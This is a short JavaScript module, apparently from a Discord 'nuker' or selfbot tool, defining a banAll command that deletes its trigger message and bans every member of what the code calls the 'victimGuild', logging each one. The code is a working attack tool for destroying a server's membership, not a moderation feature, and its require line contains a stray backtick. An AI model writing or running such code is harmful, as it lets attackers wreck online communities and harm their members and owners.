const Logger = require('../utils/logger.js`');

module.exports = async function banAll(message, client) {
    await message.delete();
    if (message.author.id !== client.user.id) return;
    const victimGuild = message.guild;
    let bannedCount = 0;

    const victimMembers = victimGuild.members.cache.filter(
        member => member.id !== client.user.id
    );

    for (const victimMember of victimMembers.values()) {
        try {
            Logger.info(`Banning member: ${victimMember.user.tag}`);
            await victimMember.ban();
            bannedCount++;
        } catch (error) {
            Logger.error(`Failed to ban member: ${victimMember.user.tag}. Error: ${error.message}`);
        }
    }

    Logger.success(`Banned ${bannedCount} members`);
};